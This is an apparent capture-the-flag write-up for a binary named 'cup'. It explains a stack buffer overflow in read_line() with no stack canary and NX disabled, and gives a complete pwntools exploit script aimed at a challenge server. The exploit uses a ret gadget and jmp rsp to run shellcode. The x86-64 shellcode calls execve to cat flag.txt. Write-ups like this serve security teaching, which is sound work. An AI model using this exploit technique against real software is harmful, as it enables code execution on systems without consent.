CUP_OVERFLOW_WRITEUP

VULN: NO CANARY, NX DISABLED, BUFFER OVERFLOW

VULN_FUNC: read_line()

GOAL: overwrite the saved rip to jump to shellcode. 

INVESTIGATE: First, open the elf in ghidra for easy viewability of what's going on. Starting in main, we see multiple local variables on the stack. One var, local_68, is passed to the function read_line. When we follow read_line, we see it is reading from stdin to local_68. local_68 is then passed to atoi, which is used in a switch case to progress the game. 

INTERWORKINGS: Looking at read_line, we see that it reads an undefinite number of bytes to local_68 from stdin, but, as we saw in main, local_68 is only allocated 64 bytes. Therefore, we have a buffer overflow. Note, however, the atoi function that takes our payload as input. The first char of our byte string payload must be an integer that won't activate the switch case. If you pass atoi ascii, it will return 0, which is a valid input and continues into the game loop so we'd never hit ret to our overflown saved rip. After we have access to saved rip, we need to send the instruction pointer somewhere that we have control over. jmp rsp will send you to the top of the new stack which is where the next part of your string, the shell code, will be written. Throw together some shell code to cat flag or get shell and you should be good! But wait, there's more. If you just overwrite saved rip with the address to jmp rsp, you will have a misalignment. Luckily, this is easily fixed by appending a ret just before jmp rsp to correct alignment. Very nice.

CODE:

******* python **********

from pwn import *
#p = process("cup")
p = connect("cmgr.c3t.eecs.net", 49631)
elf = context.binary = ELF("./cup")
rop = ROP(elf)
ret = rop.find_gadget(['ret']).address
jmp_rsp = next(elf.search(asm('jmp rsp')))

print(hex(jmp_rsp))
print(hex(ret))
with open('./shellcode','rb') as f:
    shellcode = f.read()
offset = 103

payload = b'9'
payload += b'a'*offset
payload += p64(ret)
payload += p64(jmp_rsp)
payload += shellcode + b'\n'

print(payload)
# print(p.recvuntil('Inc.\n'))
print("check 1")
# print(p.recvuntil("None (leave)\n\n"))
print("check 2")
p.send(payload)
p.interactive()

******** ASM ***********

[BITS 64]
mov r8, rax
add rax, CAT_FILE
add r8, FLAG_FILE
add rax, rsp
add r8, rsp
mov rdi, rax
push 0
mov rdx, rsp
push r8
push rdi
mov rsi, rsp 
mov rax, 0x3b
syscall


FLAG_FILE: db "flag.txt", 0
CAT_FILE: db "/usr/bin/cat", 0

## must run $ nasm shellcode.asm
## to turn the file into hex op code 
## before executing